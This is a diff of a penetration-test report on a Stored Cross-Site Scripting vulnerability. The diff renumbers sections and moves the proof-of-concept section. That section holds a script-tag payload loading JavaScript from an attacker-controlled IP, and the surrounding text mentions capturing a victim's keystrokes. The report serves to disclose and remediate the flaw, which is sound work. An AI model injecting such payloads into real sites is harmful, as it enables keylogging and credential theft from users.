@@ -33,7 +33,7 @@ Stages of the assessment:
 
 ## ⚠️ 4. Vulnerability Details --- Stored XSS
 
-### 4.4 Description
+### 4.1 Description
 
 A description of the Stored Cross-Site Scripting vulnerability and its
 implications.
@@ -52,9 +52,6 @@ implications.
 -   Relevant URL
 -   Parameters vulnerable to injection
 
-### 4.4 Proof of Concept (PoC)
-
-<script type="text/javascript" src="http://192.168.31.162/tal/test1.js"></script>
 
 ## 🔍 5. Steps to Reproduce
 
@@ -108,9 +105,11 @@ The attacker can now view logged keystrokes captured from the victim’s browser
 
 <img width="500" height="232" alt="image" src="https://github.com/user-attachments/assets/717588bc-4940-4685-bdf8-6453d7a8256f" >
 
+### 6. Proof of Concept (PoC)
 
+<script type="text/javascript" src="http://192.168.31.162/tal/test1.js"></script>
 
-## 📉 6. Risk Rating
+## 📉 7. Risk Rating
 
   Category       Level
   -------------- --------------
@@ -134,7 +133,7 @@ The attacker can now view logged keystrokes captured from the victim’s browser
 -   Improve secure coding practices
 
 
-## 📚 9. References
+## 📚 9. References  
 
 -   OWASP XSS Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
 -   OWASP WSTG - https://owasp.org/www-project-web-security-testing-guide
